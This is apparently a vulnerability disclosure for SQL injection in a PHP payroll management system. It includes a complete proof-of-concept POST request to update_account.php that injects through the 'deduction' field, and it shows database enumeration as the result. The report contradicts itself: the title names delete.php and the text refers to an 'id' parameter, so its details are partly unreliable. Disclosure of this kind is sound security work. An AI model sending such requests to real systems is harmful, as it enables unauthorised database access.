# payroll-management-system-in-php has sql injection in delete.php

## supplier 
https://code-projects.org/payroll-management-system-in-php-with-source-code/
## Vulnerability parameter
update_account.php

## describe

An unrestricted SQL injection attack exists in payroll-management-system in update_account.php. The parameters that can be controlled are as follows: $deduction. This function executes the id parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

**Code analysis**    

When the value of   $deduction parameter is obtained in function , it will be concatenated into SQL statements and executed, which has a SQL injection vulnerability. 

![Image](https://github.com/user-attachments/assets/7a216a65-e18d-41eb-89d8-9359de40c28f)



## POC

```
POST /update_account.php HTTP/1.1
Host: payroll
Content-Length: 75
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://payroll
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://payroll/home_employee.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=85u4m47klj7ldjr47mclti8mr6
Connection: close

id=1&deduction=1*&overtime=1&bonus=1
```



**Result**

get databases 

![image-20241226013405312](https://github.com/user-attachments/assets/fd4a6d5f-7c7d-418d-8db1-2bbd2d5bc9a0)
